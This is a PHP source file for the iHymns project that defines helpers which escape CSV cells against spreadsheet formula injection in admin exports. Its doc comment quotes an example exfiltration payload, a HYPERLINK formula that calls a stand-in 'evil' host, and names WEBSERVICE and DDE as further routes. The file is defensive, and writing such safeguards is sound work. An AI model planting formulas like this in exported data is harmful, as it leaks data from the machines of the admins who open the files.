<?php

declare(strict_types=1);

/**
 * iHymns — CSV-safe output helpers (#1386 security audit).
 *
 * Copyright (c) 2026 iHymns. All rights reserved.
 *
 * SECURITY — CSV / formula injection (CWE-1236):
 * Spreadsheet apps (Excel, Google Sheets, LibreOffice, Numbers) treat a cell
 * whose text begins with `= + - @` (or a leading TAB / CR) as a FORMULA. Our
 * admin CSV exports emit DB- and request-derived values — song titles,
 * copyright, writer/composer names, search queries, user-agents, referrers —
 * that an attacker can seed with a leading formula trigger (e.g. a search for
 * `=HYPERLINK("http://evil/?"&A1)` is logged verbatim). When an admin later
 * opens the export, the formula executes on THEIR machine (data exfiltration
 * via =HYPERLINK / =WEBSERVICE / DDE, etc.). Every exported cell must be passed
 * through ihymns_csv_cell(); ihymns_fputcsv() neutralises a whole row at once.
 *
 * @see https://owasp.org/www-community/attacks/CSV_Injection
 */

if (!function_exists('ihymns_csv_cell')) {
    /**
     * Neutralise a single CSV cell against formula injection by prefixing a
     * leading formula-trigger character with a single quote (the standard,
     * spreadsheet-recognised "treat as text" escape).
     *
     * @param mixed $value The raw cell value (cast to string).
     * @return string The formula-safe cell value.
     */
    function ihymns_csv_cell($value): string
    {
        $s = (string)$value;
        if ($s !== '' && in_array($s[0], ['=', '+', '-', '@', "\t", "\r"], true)) {
            return "'" . $s;
        }
        return $s;
    }

    /**
     * fputcsv() with every cell neutralised against formula injection.
     * Drop-in replacement for fputcsv($stream, $row) in export code.
     *
     * @param resource $stream An open writable stream (e.g. php://output).
     * @param array    $row    The row of cell values.
     */
    function ihymns_fputcsv($stream, array $row): void
    {
        fputcsv($stream, array_map('ihymns_csv_cell', $row));
    }
}
